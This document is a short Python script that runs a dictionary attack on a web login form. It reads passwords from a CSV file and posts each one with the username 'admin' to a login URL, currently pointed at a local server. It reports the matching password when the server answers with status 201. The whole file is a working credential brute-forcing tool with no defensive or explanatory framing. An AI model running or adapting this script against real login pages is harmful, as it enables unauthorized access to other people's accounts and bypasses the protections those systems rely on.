from colorama import init, Fore, Style
import requests
import csv

init()

url = 'http://127.0.0.1:5001/login'
username = 'admin'
password_file = <'YOUR CSV FILE PATH'>


def attempt_login(username, password):
    data = {
        'username': username,
        'password': password
    }
    response = requests.post(url, data=data)
    return response

with open(password_file, mode='r', encoding='utf-8') as file:
    reader = csv.reader(file)
    for i, row in enumerate(reader, start=1):
        password = row[0] 
        response = attempt_login(username, password)
        if response.status_code == 201:
            print(Fore.GREEN + f'''
                Response Success.
                
                {Fore.YELLOW}{i} attempts.{Fore.GREEN}

                URL : {url}
                Username: {username}, Password: {password}
                Try this ID

            ''' + Style.RESET_ALL)
            break
        else:
            print(f'''Try Password : {Fore.GREEN}{password}{Style.RESET_ALL}
{Fore.RED}Log in Failed{Style.RESET_ALL}, {Fore.WHITE}attempts = {i}''' + Style.RESET_ALL
            )
